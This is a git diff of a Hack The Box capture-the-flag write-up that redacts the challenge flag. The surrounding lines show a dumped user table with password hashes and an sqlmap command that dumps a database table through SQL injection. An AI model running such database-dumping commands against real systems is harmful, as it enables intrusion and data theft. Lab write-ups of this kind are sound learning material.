@@ -35,7 +35,7 @@ Dumping the data in the user table:
 | 1   | 81b02809a35976b5f98ce12bb9dd9ba9 | user34531 |
 | 2   | 275206a266635e02f1a5134472652683 | admin     |
 
-This, of course, caught our attention, but checking the hashes did not produce any passwords. So we moved on to ***dump the data in the requestlist table***, which gave us the flag **HTB{byp4553d_4nd_35c4l4t3d}**.
+This, of course, caught our attention, but checking the hashes did not produce any passwords. So we moved on to ***dump the data in the requestlist table***, which gave us the flag.
 
 	sqlmap -r login.txt --flush-session -D requestdb --dbms MySql --dump -T requestlist 
 
@@ -44,4 +44,4 @@ This, of course, caught our attention, but checking the hashes did not produce a
 |     |                             | .        |          |          |
 |     |                             | .        |          |          |
 |     |                             | .        |          |          |
-| 8   | HTB{byp4553d_4nd_35c4l4t3d} | 0        | HTBland  | HTBer    |
+| 8   | HTB{______Redacted_______}  | 0        | HTBland  | HTBer    |
